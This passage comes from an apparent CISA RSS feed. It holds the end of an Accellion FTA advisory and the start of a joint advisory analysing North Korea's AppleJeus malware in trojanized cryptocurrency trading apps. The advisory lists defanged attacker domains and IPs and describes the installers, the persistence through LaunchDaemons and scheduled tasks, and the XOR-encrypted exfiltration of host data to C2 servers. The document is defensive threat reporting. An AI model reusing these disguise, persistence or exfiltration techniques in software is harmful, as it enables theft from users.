&lt;h3&gt;Resources&lt;/h3&gt;

&lt;ul&gt;
	&lt;li&gt;FireEye Blog – Cyber Criminals Exploit Accellion FTA for Data Theft and Extortion&amp;nbsp;
	&lt;ul&gt;
		&lt;li&gt;&lt;a href="https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html"&gt;https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html&amp;nbsp;&lt;/a&gt;&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;Center for Internet Security (CIS) Critical Security Controls for Effective Cyber Defense, known as "CIS Controls"&amp;nbsp;
	&lt;ul&gt;
		&lt;li&gt;&lt;a href="https://www.cisecurity.org/controls/"&gt;https://www.cisecurity.org/controls/&lt;/a&gt;&lt;/li&gt;
		&lt;li&gt;&lt;a href="https://www.cisecurity.org/ms-isac/"&gt;https://www.cisecurity.org/ms-isac/&lt;/a&gt;&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;Australia, Canada, New Zealand, the United Kingdom, and the United States Joint Advisory on Technical Approaches to Uncovering and Remediating Malicious Activity&amp;nbsp;
	&lt;ul&gt;
		&lt;li&gt;&lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa20-245a"&gt;https://us-cert.cisa.gov/ncas/alerts/aa20-245a&lt;/a&gt;&amp;nbsp;&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
	&lt;li&gt;CISA and MS-ISAC’s Ransomware Guide&amp;nbsp;
	&lt;ul&gt;
		&lt;li&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/CISA_MS-ISAC_Ransomware%20Guide_S508C.pdf"&gt;https://www.cisa.gov/sites/default/files/publications/CISA_MS-ISAC_Ransomware%20Guide_S508C.pdf&lt;/a&gt;&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;
                    &lt;h3&gt;References&lt;/h3&gt;
		        &lt;ul&gt;		            	&lt;li&gt;&lt;a href="https://www.cyber.gov.au/"&gt;[1] Australian Cyber Security Centre (ACSC)&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.ncsc.govt.nz/"&gt;[2] New Zealand National Cyber Security Centre (NZ NCSC)&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.csa.gov.sg/"&gt;[3] Singapore Cyber Security Agency (CSA)&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.ncsc.gov.uk/"&gt;[4] United Kingdom National Cyber Security Centre (UK NCSC)&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.cisa.gov/"&gt;[5] United States Cybersecurity and Infrastructure Security Agency (CISA)&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.cisecurity.org/ms-isac/"&gt;[6] United States Multi-State Information Sharing and Analysis Center (MS-ISAC)&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.accellion.com/company/press-releases/accellion-provides-update-to-recent-fta-security-incident/"&gt;[7] Accellion Press Release: Update to Recent FTA Security Incident &lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.accellion.com/company/press-releases/accellion-provides-update-to-recent-fta-security-incident/"&gt;[8] Accellion Press Release: Update to Recent FTA Security Incident&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://www.accellion.com/sites/default/files/resources/fta-eol.pdf"&gt;[9] Accellion Announcement: End-of-Life for Legacy FTA Software&lt;/a&gt;&lt;/li&gt;		        &lt;/ul&gt;            &lt;h3&gt;Revisions&lt;/h3&gt;
		&lt;ul&gt;			            &lt;li&gt;February 24, 2021: Initial Version&lt;/li&gt;		&lt;/ul&gt;
		&lt;hr /&gt;
            &lt;div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"&gt;&lt;p class="privacy-and-terms"&gt;This product is provided subject to this &lt;a href="https://us-cert.cisa.gov/privacy/notification"&gt;Notification&lt;/a&gt; and this &lt;a href="https://www.dhs.gov/privacy-policy"&gt;Privacy &amp;amp; Use&lt;/a&gt; policy.&lt;/p&gt;
&lt;/div&gt;
      </description>
  <pubDate>Wed, 24 Feb 2021 14:00:00 +0000</pubDate>
    <dc:creator>CISA</dc:creator>
    <guid isPermaLink="false">16231 at https://us-cert.cisa.gov</guid>
    </item>
<item>
	<title>AA21-048A: AppleJeus: Analysis of North Korea’s Cryptocurrency Malware </title>
	<link>https://us-cert.cisa.gov/ncas/alerts/aa21-048a</link>
	<description>Original release date: February 17, 2021 | Last revised: April 15, 2021&lt;br/&gt;&lt;h3&gt;Summary&lt;/h3&gt;&lt;p class="tip-intro" style="font-size: 15px;"&gt;&lt;em&gt;This Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&amp;amp;CK®) framework. See the &lt;a href="https://attack.mitre.org/versions/v8/techniques/enterprise/"&gt;ATT&amp;amp;CK for Enterprise&lt;/a&gt; for all referenced threat actor tactics and techniques.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;This joint advisory is the result of analytic efforts among the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Treasury (Treasury) to highlight the cyber threat to cryptocurrency posed by North Korea, formally known as the Democratic People’s Republic of Korea (DPRK), and provide mitigation recommendations. Working with U.S. government partners, FBI, CISA, and Treasury assess that Lazarus Group—which these agencies attribute to North Korean state-sponsored&amp;nbsp;advanced persistent threat (APT) actors—is targeting individuals and companies, including cryptocurrency exchanges and financial service companies, through the dissemination of cryptocurrency trading applications that have been modified to include malware that facilitates theft of cryptocurrency.&lt;/p&gt;

&lt;p&gt;These cyber actors have targeted organizations for cryptocurrency theft in over 30 countries during the past year alone. It is likely that these actors view modified cryptocurrency trading applications as a means to circumvent international sanctions on North Korea—the applications enable them to gain entry into companies that conduct cryptocurrency transactions and steal cryptocurrency from victim accounts. As highlighted in &lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa20-239a"&gt;FASTCash 2.0: North Korea's BeagleBoyz Robbing Banks&lt;/a&gt; and &lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa20-106a"&gt;Guidance on the North Korean Cyber Threat&lt;/a&gt;, North Korea’s state-sponsored cyber actors are targeting cryptocurrency exchanges and accounts to steal and launder hundreds of millions of dollars in cryptocurrency.[&lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa20-239a"&gt;1&lt;/a&gt;][&lt;a href="https://home.treasury.gov/news/press-releases/sm924"&gt;2&lt;/a&gt;][&lt;a href="https://www.justice.gov/opa/pr/two-chinese-nationals-charged-laundering-over-100-million-cryptocurrency-exchange-hack"&gt;3&lt;/a&gt;] The U.S. Government refers to malicious cyber activity by the North Korean government as HIDDEN COBRA. For more information on HIDDEN COBRA activity, visit &lt;a href="https://us-cert.cisa.gov/northkorea"&gt;https://www.us-cert.cisa.gov/northkorea&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The U.S. Government has identified malware and indicators of compromise (IOCs) used by the North Korean government to facilitate cryptocurrency thefts; the cybersecurity community refers to this activity as “AppleJeus.” This report catalogues AppleJeus malware in detail. North Korea has used AppleJeus malware posing as cryptocurrency trading platforms since at least 2018. In most instances, the malicious application—seen on both Windows and Mac operating systems—appears to be from a legitimate cryptocurrency trading company, thus fooling individuals into downloading it as a third-party application from a website that seems legitimate. In addition to infecting victims through legitimate-looking websites, HIDDEN COBRA actors also use phishing, social networking, and social engineering techniques to lure users into downloading the malware.&lt;/p&gt;

&lt;p&gt;Refer to the following Malware Analysis Reports (MARs) for full technical details of AppleJeus malware and associated IOCs.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048a"&gt;MAR-10322463-1.v1: AppleJeus – Celas Trade Pro&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048b"&gt;MAR-10322463-2.v1: AppleJeus – JMT Trading&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048c"&gt;MAR-10322463-3.v1: AppleJeus – Union Crypto&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048d"&gt;MAR-10322463-4.v1: AppleJeus – Kupay Wallet&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048e"&gt;MAR-10322463-5.v1: AppleJeus – CoinGoTrade&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048f"&gt;MAR-10322463-6.v1: AppleJeus – Dorusio&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048g"&gt;MAR-10322463-7.v1: AppleJeus – Ants2Whale&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/Joint_Cybersecurity_Advisory_AppleJeus%E2%80%93Analysis%20of%20North%20Korea%E2%80%99s%20Cryptocurrency%20Malware.pdf"&gt;Click here&lt;/a&gt; for a PDF version of this report.&lt;/p&gt;
&lt;h3&gt;Technical Details&lt;/h3&gt;&lt;p&gt;The North Korean government has used multiple versions of AppleJeus since the malware was initially discovered in 2018. This section outlines seven of the versions below. The MARs listed above provide further technical details of these versions. Initially, HIDDEN COBRA actors used websites that appeared to host legitimate cryptocurrency trading platforms to infect victims with AppleJeus; however, these actors are now also using other initial infection vectors, such as phishing, social networking, and social engineering techniques, to get users to download the malware.&lt;/p&gt;

&lt;h3 class="italic"&gt;Targeted Nations&lt;/h3&gt;

&lt;p&gt;HIDDEN COBRA actors have targeted institutions with AppleJeus malware in several sectors, including energy, finance, government, industry, technology, and telecommunications. Since January 2020, the threat actors have targeted these sectors in the following countries: Argentina, Australia, Belgium, Brazil, Canada, China, Denmark, Estonia, Germany, Hong Kong, Hungary, India, Ireland, Israel, Italy, Japan, Luxembourg, Malta, the Netherlands, New Zealand, Poland, Russia, Saudi Arabia, Singapore, Slovenia, South Korea, Spain, Sweden, Turkey, the United Kingdom, Ukraine, and the United States (figure 1).&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;p class="text-align-center"&gt;&lt;img alt="" data-entity-type="file" data-entity-uuid="ca04f2c3-ef06-4bb4-b3f5-f674e05d3088" height="362" src="https://us-cert.cisa.gov/sites/default/files/publications/Jeus_1.png" width="690" /&gt;&lt;br /&gt;
&amp;nbsp;&lt;br /&gt;
&lt;em&gt;Figure 1: Countries targeted with AppleJeus by HIDDEN COBRA threat actors since 2020&lt;/em&gt;&lt;/p&gt;

&lt;h3 class="italic"&gt;AppleJeus Versions Note&lt;/h3&gt;

&lt;p&gt;The version numbers used for headings in this document correspond to the order the AppleJeus campaigns were identified in open source or through other investigative means. These versions may or may not be in the correct order to develop or deploy the AppleJeus campaigns.&lt;/p&gt;

&lt;h3 class="italic"&gt;AppleJeus Version 1: Celas Trade Pro&lt;/h3&gt;

&lt;h4&gt;&lt;strong&gt;Introduction and Infrastructure&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;In August 2018, open-source reporting disclosed information about a trojanized version of a legitimate cryptocurrency trading application on an undisclosed victim’s computer. The malicious program, known as Celas Trade Pro, was a modified version of the benign Q.T. Bitcoin Trader application. This incident led to the victim company being infected with a Remote Administration Tool (RAT) known as FALLCHILL, which was attributed to North Korea (HIDDEN COBRA) by the U.S. Government. FALLCHILL is a fully functional RAT with multiple commands that the adversary can issue from a command and control (C2) server to infected systems via various proxies. FALLCHILL typically infects a system as a file dropped by other HIDDEN COBRA malware (&lt;em&gt;Develop Capabilities: Malware &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1587/001/"&gt;T1587.001&lt;/a&gt;]). Because of this, additional HIDDEN COBRA malware may be present on systems compromised with FALLCHILL.[&lt;a href="https://us-cert.cisa.gov/ncas/alerts/TA17-318A"&gt;4&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;Further research revealed that a phishing email from a Celas LLC company (&lt;em&gt;Phishing: Spearphishing Link&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1566/002/"&gt;T1566.002&lt;/a&gt;]) recommended the trojanized cryptocurrency trading application to victims. The email provided a link to the Celas’ website, &lt;code&gt;celasllc[.]com&lt;/code&gt; (&lt;em&gt;Acquire Infrastructure: Domain &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1583/001/"&gt;T1583.001&lt;/a&gt;]), where the victim could download a Windows or macOS version of the trojanized application.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;celasllc[.]com&lt;/code&gt; domain resolved to the following Internet Protocol (IP) addresses from May 29, 2018, to January 23, 2021.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;45.199.63[.]220&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;107.187.66[.]103&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;145.249.106[.]19&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;175.29.32[.]160&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;185.142.236[.]213&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;185.181.104[.]82&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;198.251.83[.]27&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;208.91.197[.]46&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;209.99.64[.]18&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;code&gt;celasllc[.]com&lt;/code&gt; domain had a valid Sectigo (previously known as Comodo) Secure Sockets Layer (SSL) certificate (&lt;em&gt;Obtain Capabilities: Digital Certificates &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1588/004/"&gt;T1588.004&lt;/a&gt;]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;Celas Trade Pro Application Analysis&lt;/strong&gt;&lt;/h4&gt;

&lt;h4&gt;&lt;em&gt;&lt;strong&gt;Windows Program&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt;

&lt;p&gt;The Windows version of the malicious Celas Trade Pro application is an MSI Installer (&lt;code&gt;.msi&lt;/code&gt;). The MSI Installer installation package comprises a software component and an application programming interface (API) that Microsoft uses for the installation, maintenance, and removal of software. The installer looks legitimate and is signed by a valid Sectigo certificate that was purchased by the same user as the SSL certificate for celasllc[.]com (&lt;em&gt;Obtain Capabilities: Code Signing Certificates&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1588/003/"&gt;T1588.003&lt;/a&gt;]). The MSI Installer asks the victim for administrative privileges to run (&lt;em&gt;User Execution: Malicious File&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1204/002"&gt;T1204.002&lt;/a&gt;]).&lt;/p&gt;

&lt;p&gt;Once permission is granted, the threat actor is able to run the program with elevated privileges (&lt;em&gt;Abuse Elevation Control Mechanism&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1548/"&gt;T1548&lt;/a&gt;]) and MSI executes the following actions.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Installs &lt;code&gt;CelasTradePro.exe&lt;/code&gt; in folder &lt;code&gt;C:\Program Files (x86)\CelasTradePro&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Installs &lt;code&gt;Updater.exe&lt;/code&gt; in folder &lt;code&gt;C:\Program Files (x86)\CelasTradePro&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Runs &lt;code&gt;Updater.exe&lt;/code&gt; with the &lt;code&gt;CheckUpdate&lt;/code&gt; parameters&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;code&gt;CelasTradePro.exe&lt;/code&gt; program asks for the user’s exchange and loads a legitimate-looking cryptocurrency trading platform—very similar to the benign Q.T. Bitcoin Trader—that exhibits no signs of malicious activity.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;Updater.exe&lt;/code&gt; program has the same program icon as &lt;code&gt;CelasTradePro.exe&lt;/code&gt;. When run, it checks for the &lt;code&gt;CheckUpdate&lt;/code&gt; parameter, collects the victim’s host information (&lt;em&gt;System Owner/User Discovery&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1033"&gt;T1033&lt;/a&gt;]), encrypts the collected information with a hardcoded XOR encryption, and sends information to a C2 website (&lt;em&gt;Exfiltration Over C2 Channe&lt;/em&gt;l [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1041"&gt;T1041&lt;/a&gt;]).&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;macOS X Program&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The macOS version of the malicious application is a DMG Installer that has a disk image format that Apple commonly uses to distribute software over the internet. The installer looks legitimate and has a valid digital signature from Sectigo (&lt;em&gt;Obtain Capabilities: Digital Certificates &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1588/004/"&gt;T1588.004&lt;/a&gt;]). It has very similar functionality to the Windows version. The installer executes the following actions.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Installs &lt;code&gt;CelasTradePro&lt;/code&gt; in folder &lt;code&gt;/Applications/CelasTradePro.app/Contents/MacOS/&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Installs &lt;code&gt;Updater&lt;/code&gt; in folder &lt;code&gt;/Applications/CelasTradePro.app/Contents/MacOS&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Executes a &lt;code&gt;postinstall&lt;/code&gt; script
	&lt;ul&gt;
		&lt;li&gt;Moves &lt;code&gt;.com.celastradepro.plist&lt;/code&gt; to folder &lt;code&gt;LaunchDaemons&lt;/code&gt;&lt;/li&gt;
		&lt;li&gt;Runs &lt;code&gt;Updater&lt;/code&gt; with the &lt;code&gt;CheckUpdate&lt;/code&gt; parameter&lt;/li&gt;
	&lt;/ul&gt;
	&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;CelasTradePro&lt;/code&gt; asks for the user’s exchange and loads a legitimate-looking cryptocurrency trading platform—very similar to the benign Q.T. Bitcoin Trader—that exhibits no signs of malicious activity.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Updater&lt;/code&gt; checks for the &lt;code&gt;CheckUpdate&lt;/code&gt; parameter and, when found, it collects the victim’s host information (&lt;em&gt;System Owner/User Discovery &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1033"&gt;T1033]&lt;/a&gt;), encrypts the collected information with a hardcoded XOR key before exfiltration, and sends the encrypted information to a C2 website (&lt;em&gt;Exfiltration Over C2 Channel &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1041"&gt;T1041&lt;/a&gt;]). This process helps the adversary obtain persistence on a victim’s network.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;postinstall&lt;/code&gt; script is a sequence of instructions that runs after successfully installing an application (&lt;em&gt;Command and Scripting Interpreter: Unix Shell&lt;/em&gt;&amp;nbsp;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1059/004/"&gt;T1059.004&lt;/a&gt;]). This script moves property list (&lt;code&gt;plist&lt;/code&gt;) file &lt;code&gt;.com.celastradepro.plist&lt;/code&gt; from the installer package to the &lt;code&gt;LaunchDaemons&lt;/code&gt; folder (&lt;em&gt;Scheduled Task/Job: Launchd&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1053/004/"&gt;T1053.004&lt;/a&gt;]). The leading “.” makes it unlisted in the Finder app or default Terminal directory listing (&lt;em&gt;Hide Artifacts: Hidden Files and Directories&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1564/001/"&gt;T1564.001&lt;/a&gt;]). Once in the folder, this property list (&lt;code&gt;plist&lt;/code&gt;) file will launch the &lt;code&gt;Updater&lt;/code&gt; program with the &lt;code&gt;CheckUpdate&lt;/code&gt; parameter on system load as Root for every user. Because the &lt;code&gt;LaunchDaemon&lt;/code&gt; will not run automatically after the &lt;code&gt;plist&lt;/code&gt; file is moved, the &lt;code&gt;postinstall&lt;/code&gt; script launches the &lt;code&gt;Updater&lt;/code&gt; program with the &lt;code&gt;CheckUpdate&lt;/code&gt; parameter and runs it in the background (Create or &lt;em&gt;Modify System Process: Launch Daemon &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1543/004/"&gt;T1543.004&lt;/a&gt;]).&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;Payload&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;After a cybersecurity company published a report detailing the above programs and their malicious extras, the website was no longer accessible. Since this site was the C2 server, the payload cannot be confirmed. The cybersecurity company that published the report states the payload was an encrypted and obfuscated binary (&lt;em&gt;Obfuscated Files or Information &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1027"&gt;T1027&lt;/a&gt;]), which eventually drops FALLCHILL onto the machine and installs it as a service (&lt;em&gt;Create or Modify System Process: Windows Service &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1543/003"&gt;T1543.003&lt;/a&gt;]). FALLCHILL malware uses an RC4 encryption algorithm with a 16-byte key to protect its communications (&lt;em&gt;Encrypted Channel: Symmetric Cryptography&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1573/001"&gt;T1573.001&lt;/a&gt;]). The key employed in these versions has also been used in a previous version of FALLCHILL.[&lt;a href="https://us-cert.cisa.gov/ncas/alerts/TA17-318A"&gt;5&lt;/a&gt;][&lt;a href="https://attack.mitre.org/versions/v8/software/S0181/"&gt;6&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;For more details on AppleJeus Version 1: Celas Trade Pro, see &lt;a href="https://us-cert.gov/ncas/analysis-reports/ar21-048a"&gt;MAR-10322463-1.v1&lt;/a&gt;.&lt;/p&gt;

&lt;h3 class="italic"&gt;&lt;strong&gt;AppleJeus Version 2: JMT Trading&lt;/strong&gt;&lt;/h3&gt;

&lt;h4&gt;&lt;strong&gt;Introduction and Infrastructure&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;In October 2019, a cybersecurity company identified a new version of the AppleJeus malware—JMT Trading—thanks to its many similarities to the original AppleJeus malware. Again, the malware was in the form of a cryptocurrency trading application, which a legitimate-looking company, called JMT Trading, marketed and distributed on their website, &lt;code&gt;jmttrading[.]org&lt;/code&gt; (&lt;em&gt;Acquire Infrastructure: Domain&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1583/001/"&gt;T1583.001&lt;/a&gt;]). This website contained a “Download from GitHub” button, which linked to JMT Trading’s GitHub page (&lt;em&gt;Acquire Infrastructure: Web Services&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1583/006"&gt;T1583.006&lt;/a&gt;]), where Windows and macOS X versions of the JMT Trader application were available for download (&lt;em&gt;Develop Capabilities: Malware&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1587/001/"&gt;T1587.001&lt;/a&gt;]). The GitHub page also included .zip and tar.gz files containing the source code.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;jmttrading[.]org&lt;/code&gt; domain resolved to the following IP addresses from October 15, 2016, to January 22, 2021.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;code&gt;45.33.2[.]79&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;45.33.23[.]183&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;45.56.79[.]23&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;45.79.19[.]196&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;96.126.123[.]244&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;146.112.61[.]107&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;184.168.221[.]40&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;184.168.221[.]57&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;198.187.29[.]20&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;198.54.117[.]197&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;198.54.117[.]198&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;198.54.117[.]199&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;198.54.117[.]200&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;&lt;code&gt;198.58.118[.]167&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;code&gt;jmttrading[.]org&lt;/code&gt; domain had a valid Sectigo SSL certificate (&lt;em&gt;Obtain Capabilities: Digital Certificates &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1588/004/"&gt;T1588.004&lt;/a&gt;]). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence. The current SSL certificate was issued by Let’s Encrypt.&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;JMT Trading Application Analysis&lt;/strong&gt;&lt;/h4&gt;

&lt;h4 class="italic"&gt;&lt;strong&gt;&lt;em&gt;Windows Program&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The Windows version of the malicious cryptocurrency application is an MSI Installer. The installer looks legitimate and has a valid digital signature from Sectigo (&lt;em&gt;Obtain Capabilities: Digital Certificates&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1588/004/"&gt;T1588.004&lt;/a&gt;]). The signature was signed with a code signing certificate purchased by the same user as the SSL certificate for &lt;code&gt;jmttrading[.]org&lt;/code&gt; (&lt;em&gt;Obtain Capabilities: Code Signing Certificates&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1588/003/"&gt;T1588.003&lt;/a&gt;]). The MSI Installer asks the victim for administrative privileges to run (&lt;em&gt;User Execution: Malicious File&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1204/002"&gt;T1204.002&lt;/a&gt;]).&lt;/p&gt;

&lt;p&gt;Once permission is granted, the MSI executes the following actions.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Installs &lt;code&gt;JMTTrader.exe&lt;/code&gt; in folder &lt;code&gt;C:\Program Files (x86)\JMTTrader&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Installs &lt;code&gt;CrashReporter.exe&lt;/code&gt; in folder &lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\AppData\Roaming\JMTTrader&lt;/code&gt;&lt;/li&gt;
	&lt;li&gt;Runs &lt;code&gt;CrashReporter.exe&lt;/code&gt; with the &lt;code&gt;Maintain&lt;/code&gt; parameter&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The &lt;code&gt;JMTTrader.exe&lt;/code&gt; program asks for the user’s exchange and loads a legitimate-looking cryptocurrency trading platform—very similar to &lt;code&gt;CelasTradePro.exe&lt;/code&gt; and the benign Q.T. Bitcoin Trader—that exhibits no signs of malicious activity.&lt;/p&gt;

&lt;p&gt;The program &lt;code&gt;CrashReporter.exe&lt;/code&gt; is heavily obfuscated with the ADVObfuscation library, renamed “snowman” (&lt;em&gt;Obfuscated Files or Information&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1027"&gt;T1027&lt;/a&gt;]). When run, it checks for the &lt;code&gt;Maintain&lt;/code&gt; parameter and collects the victim’s host information (&lt;em&gt;System Owner/User Discovery&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1033"&gt;T1033&lt;/a&gt;]), encrypts the collected information with a hardcoded XOR key before exfiltration, and sends the encrypted information to a C2 website (&lt;em&gt;Exfiltration Over C2 Channel &lt;/em&gt;[&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1041"&gt;T1041&lt;/a&gt;]). The program also creates a scheduled SYSTEM task, named &lt;code&gt;JMTCrashReporter&lt;/code&gt;, which runs &lt;code&gt;CrashReporter.exe&lt;/code&gt; with the &lt;code&gt;Maintain&lt;/code&gt; parameter at any user’s login (&lt;em&gt;Scheduled Task/Job: Scheduled Task&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1053/005"&gt;T1053.005&lt;/a&gt;]).&lt;/p&gt;

&lt;h4&gt;&lt;strong&gt;&lt;em&gt;macOS X Program&lt;/em&gt;&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.&lt;/p&gt;

&lt;ul&gt;
